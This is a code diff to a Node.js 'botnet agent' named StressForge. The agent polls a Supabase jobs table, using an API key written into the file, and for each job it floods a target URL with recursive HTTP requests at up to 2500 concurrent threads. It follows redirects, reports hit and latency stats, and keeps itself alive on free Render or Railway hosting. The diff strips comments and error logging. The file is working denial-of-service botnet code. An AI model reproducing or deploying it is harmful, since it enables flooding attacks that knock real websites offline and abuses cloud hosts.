@@ -1,7 +1,8 @@
 /**
  * STRESSFORGE BOTNET AGENT V3.6 (ENTERPRISE)
  * - Feature: Smart Redirection Following (301/302)
- * - Safety: Memory Governor (Max 2500 threads) to prevent Render Free Tier crash
+ * - Safety: Memory Governor (Max 2500 threads)
+ * - Host: Compatible with Render & Railway
  */
 const https = require('https');
 const http = require('http');
@@ -11,7 +12,7 @@ const SUPABASE_URL = "https://qbedywgbdwxaucimgiok.supabase.co";
 const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFiZWR5d2diZHd4YXVjaW1naW9rIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjQ3NDA5ODEsImV4cCI6MjA4MDMxNjk4MX0.Lz0x7iKy2UcQ3jdN4AdjSIYYISBfn233C9qT_8y8jFo";
 const MAX_SAFE_CONCURRENCY = 2500;
 
-// --- RENDER KEEP-ALIVE ---
+// --- KEEPALIVE SERVER (REQUIRED FOR RAILWAY/RENDER) ---
 const PORT = process.env.PORT || 3000;
 http.createServer((req, res) => { res.writeHead(200); res.end('StressForge Agent V3.6 Active'); })
     .listen(PORT, () => console.log(`[SYSTEM] Agent listening on port ${PORT}`));
@@ -98,26 +99,21 @@ const startAttack = (job) => {
     reqOptions.headers['Host'] = targetUrl.host;
     reqOptions.headers['Cache-Control'] = 'no-cache';
 
-    // Redirect Handler Wrapper
     const performRequest = (currentUrl, currentOptions, onFinish) => {
         const lib = currentUrl.protocol === 'https:' ? https : http;
         const req = lib.request(currentUrl, currentOptions, (res) => {
-            // Follow Redirects (301, 302, 307, 308)
             if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
                 res.resume(); 
                 try {
                     const newUrl = new URL(res.headers.location, currentUrl.href);
                     performRequest(newUrl, currentOptions, onFinish);
-                } catch(e) {
-                    onFinish(res, e); 
-                }
+                } catch(e) { onFinish(res, e); }
                 return;
             }
             res.resume();
             onFinish(res, null);
         });
         req.on('error', (e) => onFinish(null, e));
-        
         if (job.body && ['POST','PUT','PATCH'].includes(job.method)) {
              try { req.write(typeof job.body === 'string' ? job.body : JSON.stringify(job.body)); } catch(e) {}
         }
@@ -127,15 +123,12 @@ const startAttack = (job) => {
     const flood = () => {
         if (!running) return;
         const start = Date.now();
-        
         performRequest(targetUrl, reqOptions, (res, err) => {
              const lat = Date.now() - start;
              jobLatencySum += lat;
              jobReqsForLatency++;
-             
              if (!err && res && res.statusCode >= 200 && res.statusCode < 300) jobSuccess++;
              else jobFailed++;
-             
              totalRequests++;
              flood();
         });
@@ -155,7 +148,7 @@ const startAttack = (job) => {
                  total_failed: jobFailed,
                  avg_latency: avgLat
              });
-        } catch(e) { console.error('[SYNC-ERR] Failed to report stats'); }
+        } catch(e) { }
 
         if (duration > 0 && elapsed >= duration) {
             running = false;
@@ -167,14 +160,12 @@ const startAttack = (job) => {
     }, 2000);
 };
 
-// Poll every 3s
 setInterval(async () => {
     if (activeJob) return;
     try {
         const jobs = await supabaseRequest('GET', '/jobs?status=eq.PENDING&limit=1');
         if (jobs && jobs.length > 0) {
             const job = jobs[0];
-            console.log('Received Job:', job.id);
             await supabaseRequest('PATCH', `/jobs?id=eq.${job.id}`, { status: 'RUNNING' });
             startAttack(job);
         }
